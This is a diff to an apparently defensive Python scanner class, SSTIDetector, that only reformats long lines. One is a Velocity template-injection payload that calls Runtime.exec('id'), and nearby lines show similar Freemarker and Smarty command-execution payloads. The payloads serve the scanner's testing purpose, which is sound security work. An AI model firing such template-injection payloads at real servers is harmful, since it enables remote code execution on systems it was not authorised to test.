@@ -81,7 +81,13 @@ class SSTIDetector(BaseDetector):
             '${"freemarker.template.utility.Execute"?new()("id")}',
         ],
         "velocity": [
-            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
+            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))"  # noqa: E501
+            "#set($chr=$x.class.forName('java.lang.Character'))"
+            "#set($str=$x.class.forName('java.lang.String'))"
+            "#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()"
+            "#set($out=$ex.getInputStream())"
+            "#foreach($i in [1..$out.available()])"
+            "$str.valueOf($chr.toChars($out.read()))#end",
         ],
         "smarty": [
             "{php}echo `id`;{/php}",
@@ -223,7 +229,10 @@ class SSTIDetector(BaseDetector):
                         remediation="使用安全的模板引擎配置，禁用危险的函数和对象访问",
                         references=[
                             "https://portswigger.net/research/server-side-template-injection",
-                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection",
+                            "https://owasp.org/www-project-web-security-testing-guide"
+                            "/latest/4-Web_Application_Security_Testing"
+                            "/07-Input_Validation_Testing"
+                            "/18-Testing_for_Server-side_Template_Injection",
                         ],
                         extra={"template_engine": engine, "rce_possible": rce_possible},
                     )
